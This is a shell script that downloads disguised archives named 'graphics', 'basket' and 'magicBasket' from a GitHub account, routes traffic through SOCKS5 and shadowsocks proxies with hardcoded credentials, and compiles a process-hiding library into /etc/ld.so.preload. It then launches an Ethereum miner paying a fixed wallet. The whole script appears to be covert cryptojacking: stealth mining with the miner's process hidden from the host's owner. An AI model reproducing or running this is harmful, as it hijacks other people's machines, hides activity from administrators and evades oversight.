#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 176.53.133.217:57597
socks5_username = 2BHVpyGPD
socks5_password = 1rN14HAmV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/basket
chmod +x basket

apt -y install shadowsocks-libev rng-tools
rngd -r /dev/urandom
ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBasket.zip
unzip magicBasket.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./basket -a ethash -o ethproxy+ssl://eth-us-west.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5.DENT -log --proxy socks5 = Selshindeparshuram2012:V7p9BkV@191.101.148.51:45786
